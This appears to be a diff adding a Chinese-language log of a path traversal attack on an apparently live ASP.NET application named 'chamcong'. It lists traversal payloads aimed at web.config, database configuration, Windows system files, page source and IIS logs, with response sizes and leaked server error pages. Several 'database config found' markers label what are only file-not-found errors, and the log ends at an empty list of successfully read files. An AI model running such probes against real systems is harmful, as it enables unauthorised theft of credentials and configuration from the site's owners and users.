@@ -1,0 +1,96 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 新攻击：路径遍历读取敏感文件
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+策略：虽然不能写入文件，但可能可以读取现有文件
+通过导入/打开功能读取敏感文件内容
+
+[测试1] 尝试读取web.config（最高价值）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  尝试: ../../web.config
+    响应: 2750 bytes
+
+  尝试: ../../../inetpub/wwwroot/chamcong/web.config
+    响应: 8078 bytes
+
+  尝试: C:/inetpub/wwwroot/chamcong/web.config
+    响应: 7765 bytes
+    ⚠️  权限拒绝（文件存在！）
+
+  尝试: web.config
+    响应: 7978 bytes
+
+[测试2] 读取数据库配置文件
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  尝试: App_Data/database.config
+    🔥🔥🔥 发现数据库配置！
+        <title>Could not find a part of the path 'C:\TEMP\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+            <span><H1>Server Error in '/chamcong' Application.<hr width=100% size=1 color=silver></H1>
+            <h2> <i>Could not find a part of the path 'C:\TEMP\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+            <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\TEMP\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+[DirectoryNotFoundException: Could not find a part of the path &#39;C:\TEMP\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.]
+[DirectoryNotFoundException]: Could not find a part of the path &#39;C:\TEMP\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.
+
+  尝试: ../../App_Data/database.config
+    🔥🔥🔥 发现数据库配置！
+        <title>Could not find a part of the path 'C:\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+            <span><H1>Server Error in '/chamcong' Application.<hr width=100% size=1 color=silver></H1>
+            <h2> <i>Could not find a part of the path 'C:\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+            <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+[DirectoryNotFoundException: Could not find a part of the path &#39;C:\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.]
+[DirectoryNotFoundException]: Could not find a part of the path &#39;C:\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.
+
+  尝试: ../../../inetpub/wwwroot/chamcong/App_Data/database.config
+    🔥🔥🔥 发现数据库配置！
+        <title>Could not find a part of the path 'C:\inetpub\wwwroot\chamcong\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+            <span><H1>Server Error in '/chamcong' Application.<hr width=100% size=1 color=silver></H1>
+            <h2> <i>Could not find a part of the path 'C:\inetpub\wwwroot\chamcong\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+            <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\inetpub\wwwroot\chamcong\App_Data\database.config_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+[DirectoryNotFoundException: Could not find a part of the path &#39;C:\inetpub\wwwroot\chamcong\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.]
+[DirectoryNotFoundException]: Could not find a part of the path &#39;C:\inetpub\wwwroot\chamcong\App_Data\database.config_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.
+
+[测试3] 尝试读取系统文件（探测环境）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  尝试: C:/Windows/win.ini
+
+  尝试: C:/Windows/System32/drivers/etc/hosts
+
+  尝试: ../../../Windows/win.ini
+
+[测试4] 尝试读取应用源码
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  尝试: login.aspx
+
+  尝试: ../../login.aspx
+
+  尝试: ../../../inetpub/wwwroot/chamcong/login.aspx
+
+  尝试: report/inBCC.aspx
+
+  尝试: ../../report/inBCC.aspx
+
+[测试5] 尝试读取日志文件（可能包含敏感信息）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  尝试: C:/inetpub/logs/LogFiles/W3SVC1/u_ex251117.log
+
+  尝试: App_Data/logs/error.log
+
+  尝试: ../logs/application.log
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ 文件读取测试完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 总结:
+  - 测试了web.config读取
+  - 测试了数据库配置读取
+  - 测试了系统文件读取
+  - 测试了源码读取
+  - 测试了日志文件读取
+
+成功读取的文件:
